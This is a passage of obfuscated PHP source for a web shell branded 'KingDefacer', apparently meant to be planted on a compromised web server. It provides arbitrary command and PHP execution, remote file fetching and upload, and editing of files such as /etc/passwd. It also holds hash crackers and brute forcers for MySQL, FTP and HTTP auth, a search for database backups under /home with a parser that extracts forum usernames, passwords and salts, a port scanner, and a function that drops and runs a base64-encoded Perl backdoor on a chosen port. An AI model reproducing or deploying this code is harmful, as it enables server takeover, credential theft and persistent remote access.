type='text' value='tmp_database' name='sql_db'></br>Temporary table: <input type='text' value='tmp_file' name='tmp_table'></br><input type='text' value='/etc/passwd' name='sql_file'><input type='submit' name='sql_bypass' value='Bypass'></form></td></tr>\n    </table>"; } function brute_force() { echo "<form action='{$spa5bde5}' method='post' enctype='multipart/form-data'><input type='hidden' name='docrack'><table style='margin: auto; width: 100%; text-align: center;'><tr><td colspan='2'>Password crackers</td></tr>\n    <tr><td>MD5 Cracker</td><td>SHA1 Cracker</td></tr>\n    <tr><td>Hash: <input type='text' name='md5hash'><input type='submit' value='Crack' name='md5crack'></td><td>Hash: <input type='text' name='sha1hash'><input type='submit' value='Crack' name='sha1crack'></td></tr>\n    <tr><td>VBulletin Salt Cracker</td><td>SMF Salt cracker</td></tr>\n    <tr><td>Hash: <input type='text' name='vbhash'></br>Salt: <input type='text' name='vbsalt' salt='#7A'></br><input type='submit' value='Crack' name='vbcrack'></td><td>Hash: <input type='text' name='smfhash'></br>Salt: <input type='text' name='smfsalt'></br><input type='submit' value='Crack' name='smfcrack'></td></tr>\n    <tr><td>MySQL Brute Force</td><td>FTP Brute Force</td></tr>\n    <tr><td>User: <input type='text' value='root' name='mysql_user'></br>Host: <input type='text' value='localhost' name='mysql_host'></br>Port: <input type='text' value='3306' name='mysql_port'></br><input type='submit' value='Brute' name='mysqlcrack'></td><td>User: <input type='text' value='root' name='ftp_user'></br>Host: <input type='text' value='localhost' name='ftp_host'></br>Port: <input type='text' value='21' name='ftp_port'></br>Timeout: <input type='text' value='5' name='ftp_timeout'></br><input type='submit' value='Brute' name='ftpcrack'></td></tr>\n    <tr><td>Remote login Brute Force</td><td>HTTP-Auth Brute Force</td></tr>\n    <tr><td>Login form: <input type='text' value='' name='remote_login_target'></br>Username: <input type='text' value='admin' name='remote_login_user'><input type='submit' value='Brute' name='remote_login'></td><td>Username: <input type='text' name='auth_user' value='porn_user101'></br>Auth URL: <input type='text' name='auth_url'><input type='submit' value='Brute' name='authcrack'></td></tr>\n    <tr><td colspan='2'>Wordlist</td></tr>\n    <tr><td colspan='2'><input type='file' name='wordlist'></br></br><b>Notice: Be sure to check the max POST length allowed</b></td></tr>\n    </br></table></form>"; } function BackDoor() { global $spc89472; global $sp978cd2; if (!isset($_POST['backdoor_host'])) { echo "<center><form action='{$spa5bde5}?act=bh' method='post'>\n        Port: <input type='text' name='port'>\n        <input type='submit' name='backdoor_host' value='Backdoor'></center>"; } else { @($spa027fe = fopen('shbd.pl', 'w')); @fwrite($spa027fe, base64_decode($spc89472)); @fclose($spa027fe); execmd("perl shbd.pl {$_POST['port']}", $sp978cd2); echo 'Server backdoor\'d</br>'; } } function sql_rep_search($spa25e24) { global $spa5bde5; $spe7e244 = array('.db', '.sql'); @($sp232d7c = opendir($spa25e24)); while (@($spa3ecf0 = readdir($sp232d7c))) { $sp4ce699 = strrchr($spa3ecf0, '.'); if (in_array($sp4ce699, $spe7e244) && $spa3ecf0 != 'Thumbs.db' && $spa3ecf0 != 'thumbs.db') { echo "<tr><td><center><a href='{$spa5bde5}?act=f&file={$spa25e24}" . "{$spa3ecf0}'>{$spa25e24}" . "{$spa3ecf0}</center></td></tr>"; } if (is_dir($spa25e24 . $spa3ecf0) && $spa3ecf0 != '..' && $spa3ecf0 != '.') { if (!preg_match('/\\/public_html\\//', $spa25e24)) { sql_rep_search($spa25e24 . $spa3ecf0 . '/public_html/'); } else { sql_rep_search($spa25e24 . $spa3ecf0); } } } @closedir($sp232d7c); } function database_tools() { if (isset($_POST['sql_start_search'])) { echo '<center><table style=\'width: auto;\'><tr><td><center><font color=\'#FF0000\'>Databases</font></center></td></tr>'; sql_rep_search('/home/'); echo '</table></center>'; } $sp058103 = array(); if (isset($_POST['db_parse'])) { if (!is_file($_FILES['db_upath']['tmp_name']) && empty($_POST['db_dpath'])) { die('Please specify a DB to parse...'); } $spcb4d8d = empty($_POST['db_dpath']) ? 'uploaded' : 'path'; $spc15551 = $_POST['q_delimit']; if (isset($_POST['column_defined'])) { switch ($_POST['column_type']) { case 'SMF': break; case 'phpbb': break; case 'vbulletin': $sp058103 = array(4, 5, 7, 48); break; } } else { $sp920a6b = str_replace(', ', ',', trim($_POST['db_columns'])); $sp058103 = explode(',', $sp920a6b); } switch ($spcb4d8d) { case 'uploaded': @($spa027fe = fopen($_FILES['db_upath']['tmp_name'], 'r')) or die('Failed to open file for reading'); break; case 'path': @($spa027fe = fopen($_POST['db_dpath'], 'r')) or die('Failed to open file for reading'); break; } echo 'Parsing database contents...</br>'; while (!feof($spa027fe)) { $sp5c2a51 = fgets($spa027fe); $sp920a6b = str_replace(', ', ',', $sp5c2a51); $sp662a5a = explode(',', $sp920a6b); for ($sp6c3e91 = 0; $sp6c3e91 < count($sp058103); $sp6c3e91++) { $spe2a956 = $sp058103[$sp6c3e91]; if (empty($sp662a5a[$spe2a956])) { continue; } $spe4c8e1 = strpos("{$_POST['q_delimit']}", $sp662a5a[$spe2a956]); $spe4c8e1 = strpos("{$_POST['q_delimit']}", $sp662a5a[$spe2a956], $spe4c8e1); if ($sp6c3e91 !== count($sp058103) - 1) { echo "{$sp662a5a[$spe2a956]} : "; } else { echo "{$sp662a5a[$spe2a956]}</br>"; } } continue; } @fclose($spa027fe); } echo "<table style='width: 100%; margin: auto; text-align: center'>\n    <tr><td colspan='2'>Database parser</td></tr>\n    <tr><td>\n    <form action='{$spa5bde5}?act=dbs' method='post' enctype='multipart/form-data'>\n    Quote delimiter (usually ` or '): <input type='text' style='width: 20px' name='q_delimit' value='`'> Columns to retrieve (separate by commas): <input type='text' style='width: 200px' name='db_columns' value='3,5,10'></br>\n    Use predefined column match (user+pass+salt): <input type='checkbox' name='column_defined'> <select name='column_type'>\n    <option value='vbulletin'>VBulletin</option><option value='SMF'>SMF</option><option value='phpbb'>PHPBB</option>\n    </select></br>\n    Path to DB dump: <input type='text' style='width: 300px' value='/home/someuser/public_html/backup.db' name='db_dpath'>\n    </br>Upload DB dump: <input type='file' style='width: 300px' value='' name='db_upath'>\n    </br></br><input type='submit' style='width: 300px' value='Parse Database' name='db_parse'></td></tr>\n    <tr><td colspan='2'>Find database Backups</td></tr>\n    <tr><td>Only search within local path: <input type='checkbox' name='sql_search_local'> <input type='submit' value='Go' name='sql_start_search'></br></td></tr>\n    </table>"; } function show_tools() { echo "<form action='{$spa5bde5}' method='post'>\n    <table style='width: 100%; margin: auto; text-align: center'>\n    <tr><td colspan='2'>Tools</td></tr>\n    <tr><td>Forum locator</td><td>Config locator</td></tr>\n    <tr><td><form action='{$spa5bde5}' method='post'>Passwd file: <input type='text' value='/etc/passwd' name='passwd'><input type='submit' value='Find forums' name='find_forums'></form></td><td><form action='{$spa5bde5}' method='post'>Passwd file: <input type='text' value='/etc/passwd' name='passwd'><input type='submit' value='Find forums' name='find_configs'></form></td></tr>\n    <tr><td>Port scanner</td><td>Search</td></tr>\n    <tr><td><form action='{$spa5bde5}' method='post'>Host: Start port: <input type='text' value='localhost' name='host'></br>Start port: <input type='text' value='80' style='width: 50px' name='sport'> End Port: <input type'text' style='width: 50px' value='1000' name='eport'></br><input type='submit' value='Scan' name='port_scan'>Using: <select name='type'><option value='php'>PHP</option><option value='perl'>Perl</option></select></form></td><td>Finish this next</td></tr>\n    </table>"; } function TrueSize($sp676578) { if (!$sp676578) { return 0; } if ($sp676578 >= 1073741824) { return round($sp676578 / 1073741824) . ' GB'; } elseif ($sp676578 >= 1048576) { return round($sp676578 / 1048576) . ' MB'; } elseif ($sp676578 >= 1024) { return round($sp676578 / 1024) . ' KB'; } else { return $sp676578 . ' B'; } } function CleanDir($sp6bf0a4) { $sp6bf0a4 = str_replace('\\', '/', $sp6bf0a4); $sp6bf0a4 = str_replace('//', '/', $sp6bf0a4); return $sp6bf0a4; } function Trail($sp6bf0a4) { $sp6bf0a4 = explode('/', $sp6bf0a4); array_pop($sp6bf0a4); array_pop($sp6bf0a4); $sp6ff357 = implode($sp6bf0a4, '/'); return $sp6ff357; } function Encoder() { echo "<form action='{$spa5bde5}?' method='post'>\n    <center>\n    Input: <input type='text' style='width: 300px' name='encrypt'>\n    <br><input type='submit' value='Encrypt' name='encryption'>\n    </center>\n    </form>"; } $sp46e321 = isset($_GET['d']) ? CleanDir($_GET['d']) : CleanDir(realpath(getcwd())); if (isset($_GET['d'])) { $spa5bde5 .= "?d={$_GET['d']}"; } echo "<table style='text-align: center; width: 100%'>\n<tr><td colspan='2'>Execute command</td></tr>\n<tr><td colspan='2'><form action='{$spa5bde5}?' method='post'><input type='text' style='width: 600px' value='whoami' name='cmd'><input type='submit' name='execmd' value='Execute'></form></td></tr>\n<tr><td colspan='2'>Execute PHP</td></tr>\n<tr><td colspan='2'><form action='{$spa5bde5}' method='post'><textarea rows='2' cols='80' name='phpcode' style='background-color: black;'>//Don't include PHP tags</textarea><input type='submit' name='execphp' value='Execute'></form></td></tr>\n<tr><td>Create directory</td><td>Create file</td></tr>\n<tr><td><form action='{$spa5bde5}' method='post'><input type='text' style='width: 250px' value='{$sp46e321}/sikreet/' name='newdir'><input type='submit' value='Create' name='cnewdir'></form></td><td><form action='{$spa5bde5}' method='post'><input type='text' style='width: 250px' value='{$sp46e321}/index2.php' name='newfile'><input type='submit' value='Create' name='cnewfile'></form></td></tr>\n<tr><td>Enter directory</td><td>Edit file</td></tr>\n<tr><td><form action='{$spa5bde5}' method='post'><input type='text' style='width: 225px' name='godir'><input type='submit' value='Go' name='enterdir'></form></td><td><form action='{$spa5bde5}' method='post'><input type='text' style='width: 255px' value='/etc/passwd' name='editfile'><input type='submit' name='doeditfile' value='Go'></form></td></tr>\n<tr><td>Upload file</td><td>Wget file</td></tr>\n<tr><td><form action='{$spa5bde5}' method='post' enctype='multipart/form-data'>Save location: <input type='text' style='width: 300px' value='{$sp46e321}' name='u_location'></br><input type='file' name='u_file'><input type='submit' value='Upload' name='doUpload'></form></td><td><form action='{$spa5bde5}' method='post'><input type='text' style='width: 255px' value='http://www.site.com/image1.jpg' name='wgetfile'><input type='submit' name='dogetfile' value='Go'></form</td></tr>\n<tr><td colspan='2'>Switch theme: <a href='{$spa5bde5}?theme=green'>Matrix Green</a>, <a href='{$spa5bde5}?theme=uplink'>Uplink Blue</a>, <a href='{$spa5bde5}?theme=dark'>Dark</a></td></tr>\n</table>\n</br></br><div id='bar'><center>Shell [version 2.0] Edited By <font color='red'><b>[KingDefacer]</font> | Page generated in : <font color='red'>" . round(microtime() - $sp433e3e, 2) . ' seconds</font></center></div></body></html>'; ob_end_flush();